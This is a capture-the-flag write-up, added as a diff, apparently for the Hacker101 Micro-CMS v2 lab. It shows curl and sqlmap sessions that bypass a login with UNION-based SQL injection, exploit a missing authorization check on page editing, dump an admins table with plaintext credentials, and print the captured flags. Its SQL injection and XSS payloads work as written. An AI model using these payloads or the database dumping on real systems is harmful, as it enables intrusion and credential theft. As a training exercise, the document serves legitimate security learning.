@@ -1,0 +1,254 @@
+
+Flag0 Hints:
+Regular users can only see public pages
+Getting admin access might require a more perfect union
+Knowing the password is cool, but there are other approaches that might be easier
+
+user@kali:~$ curl -X POST http://34.94.3.143/641e58bd15/login -d 'username=%27&password='
+Traceback (most recent call last):
+  File "./main.py", line 145, in do_login
+    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
+  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
+    self.errorhandler(self, exc, value)
+  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
+    raise errorvalue
+ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")
+user@kali:~$ curl -X POST http://34.94.3.143/641e58bd15/login -d 'username=%27+%3B&password='
+
+<!doctype html>
+<html>
+        <head>
+                <title>Log in</title>
+        </head>
+        <body>
+                <a href="home">&lt;-- Go Home</a>
+                <h1>Log In</h1>
+                <form method="POST">
+                        Username: <input type="text" name="username"><br>
+                        Password: <input type="password" name="password"><br>
+                        <input type="submit" value="Log In">
+                        <div style="color: red">Unknown user</div>
+                </form>
+        </body>
+</html>
+user@kali:~$ curl -X POST http://34.94.3.143/641e58bd15/login -d 'username=%27+or+1+%3B&password='
+
+<!doctype html>
+<html>
+        <head>
+                <title>Log in</title>
+        </head>
+        <body>
+                <a href="home">&lt;-- Go Home</a>
+                <h1>Log In</h1>
+                <form method="POST">
+                        Username: <input type="text" name="username"><br>
+                        Password: <input type="password" name="password"><br>
+                        <input type="submit" value="Log In">
+                        <div style="color: red">Invalid password</div>
+                </form>
+        </body>
+</html>
+user@kali:~$ 
+
+user@kali:~$ curl -X POST http://34.94.3.143/641e58bd15/login -d 'username=%27+union+all+select+password+from+admins+%3B&password='
+
+<!doctype html>
+<html>
+        <head>
+                <title>Log in</title>
+        </head>
+        <body>
+                <a href="home">&lt;-- Go Home</a>
+                <h1>Log In</h1>
+                <form method="POST">
+                        Username: <input type="text" name="username"><br>
+                        Password: <input type="password" name="password"><br>
+                        <input type="submit" value="Log In">
+                        <div style="color: red">Invalid password</div>
+                </form>
+        </body>
+</html>
+
+user@kali:~$ curl -X POST http://34.94.3.143/641e58bd15/login -d 'username=%27+union+all+select+%27foo%27+as+password+from+admins+%3B&password=foo'
+
+<!doctype html>
+<html>
+        <head>
+                <title>Logged in</title>
+        </head>
+        <body>
+                <h1>Logged In!</h1>
+                <a href="home">Go Home</a>
+                <script>setTimeout(function() { window.location = 'home'; }, 3000);</script>
+                <!-- You got logged in, congrats!  Do you have the real username and password?  If not, might want to do
+ that! -->
+        </body>
+</html>
+
+Go to the login page in a browser and use:
+user: ' union all select 'foo' as password from admins;
+pass: foo
+
+Navigate from home to 'Private Page':
+http://34.94.3.143/641e58bd15/page/3
+
+My secret is ^FLAG^cd214aaa240ff1e0b76809ec02ef956e68ca7874edcf336eb71752cbbbb2f981$FLAG$
+
+
+Editing a page and adding a script tag to the title doesn't work. Angle brackets get escaped.
+<li><a href="page/1">Micro-CMS Changelog&lt;script&gt;alert('hello');&lt;/script&gt;</a></li>
+
+Try UTF-7
+Changelog+ADw-script+AD4-alert('hello');+ADw-/script+AD4-
+
+fail.
+
+Logging in while intercepting with burp redirects to:
+
+GET /6cf4db2c9b/home HTTP/1.1
+Host: 34.94.3.143
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://34.94.3.143/6cf4db2c9b/login
+Connection: close
+Cookie: l2session=eyJhZG1pbiI6dHJ1ZX0.XhFUFg.WuQhg-Qzc1jelf787X5j5XkCZ9g
+Upgrade-Insecure-Requests: 1
+
+Note the session cookie.
+
+user@kali:~$ ADDR=http://34.94.3.143/6cf4db2c9b
+user@kali:~$ COOKIE='l2session=eyJhZG1pbiI6dHJ1ZX0.XhFUFg.WuQhg-Qzc1jelf787X5j5XkCZ9g'
+user@kali:~$ curl -X GET $ADDR/home -b $COOKIE
+
+<!doctype html>
+<html>
+        <head>
+                <title>Micro-CMS</title>
+        </head>
+        <body>
+                <a href="logout">Log out</a>
+                <ul>
+<li><a href="page/1">Micro-CMS Changelog</a></li>
+<li><a href="page/2">Markdown Test</a></li>
+<li><a href="page/3">Private Page</a></li>
+                </ul>
+                <a href="page/create">Create a new page</a>
+        </body>
+</html>
+
+
+Flag1 Hint:
+What actions could you perform as a regular user on the last level, which you can't now?
+Just because request fails with one method doesn't mean it will fail with a different method
+Different requests often have different required authorization
+
+user@kali:~$ curl -X POST $ADDR/page/edit/5 -d 'title=foo1&body=foo1'
+^FLAG^f25d2817d404bfae36a16dc2994a2500f2af396bacdacf38ecaccb74f58f144d$FLAG$
+
+
+Flag2 Hint:
+Credentials are secret, flags are secret. Coincidence?
+
+https://www.youtube.com/watch?v=1sSzBSLp9II
+
+user@kali:~/workspace$ cat l.txt 
+POST /6cf4db2c9b/login HTTP/1.1
+Host: 34.94.3.143
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://34.94.3.143/6cf4db2c9b/login
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 21
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+username=1&password=1
+user@kali:~/workspace$ sqlmap -r l.txt --dbs --random-agent --threads 8
+...
+sqlmap identified the following injection point(s) with a total of 350 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: username=1' OR NOT 3997=3997#&password=1
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=1' AND (SELECT 5997 FROM(SELECT COUNT(*),CONCAT(0x7176716b71,(SELECT (ELT(5997=5997,1))),0x717a787
+a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- FSWY&password=1
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=1' AND (SELECT 7274 FROM (SELECT(SLEEP(5)))eaSH)-- VZck&password=1
+---
+[22:13:37] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.14.0
+back-end DBMS: MySQL >= 5.0
+[22:13:37] [INFO] fetching database names
+[22:13:38] [INFO] used SQL query returns 4 entries
+[22:13:38] [INFO] starting 4 threads
+[22:13:38] [INFO] retrieved: 'information_schema'
+[22:13:38] [INFO] retrieved: 'performance_schema'
+[22:13:38] [INFO] retrieved: 'level2'
+[22:13:38] [INFO] retrieved: 'mysql'
+available databases [4]:
+[*] information_schema
+[*] level2
+[*] mysql
+[*] performance_schema
+
+[22:13:38] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/34.94.3.143'
+
+user@kali:~/workspace$ sqlmap -r l.txt -D level2 --tables --random-agent --threads 8
+...
+[22:17:34] [INFO] fetching tables for database: 'level2'
+[22:17:34] [INFO] used SQL query returns 2 entries
+[22:17:34] [INFO] starting 2 threads
+[22:17:34] [INFO] retrieved: 'admins'
+[22:17:34] [INFO] retrieved: 'pages'
+Database: level2
+[2 tables]
++--------+
+| admins |
+| pages  |
++--------+
+
+user@kali:~/workspace$ sqlmap -r l.txt -D level2 -T admins --dump --random-agent --threads 8
+...
+[22:19:03] [INFO] fetching columns for table 'admins' in database 'level2'
+[22:19:03] [INFO] used SQL query returns 3 entries
+[22:19:03] [INFO] starting 3 threads
+[22:19:03] [INFO] retrieved: 'id'
+[22:19:03] [INFO] retrieved: 'username'
+[22:19:03] [INFO] retrieved: 'password'
+[22:19:03] [INFO] retrieved: 'int(11)'
+[22:19:03] [INFO] retrieved: 'varchar(256)'
+[22:19:03] [INFO] retrieved: 'varchar(256)'
+[22:19:03] [INFO] fetching entries for table 'admins' in database 'level2'
+[22:19:04] [INFO] used SQL query returns 1 entry
+[22:19:04] [INFO] retrieved: '1'
+[22:19:04] [INFO] retrieved: 'krystina'
+[22:19:04] [INFO] retrieved: 'erasmo'
+Database: level2
+Table: admins
+[1 entry]
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+| 1  | erasmo   | krystina |
++----+----------+----------+
+
+[22:19:04] [INFO] table 'level2.admins' dumped to CSV file '/home/user/.sqlmap/output/34.94.3.143/dump/level2/admins.csv
+'
+[22:19:04] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/34.94.3.143'
+
+user@kali:~/workspace$ curl -X POST $ADDR/login -d "username=erasmo&password=krystina"
+^FLAG^8bb0fe51d1cd260bf89d46663b94c63267473dbe7d922a1a813f82adba7ebcb4$FLAG$
+
+
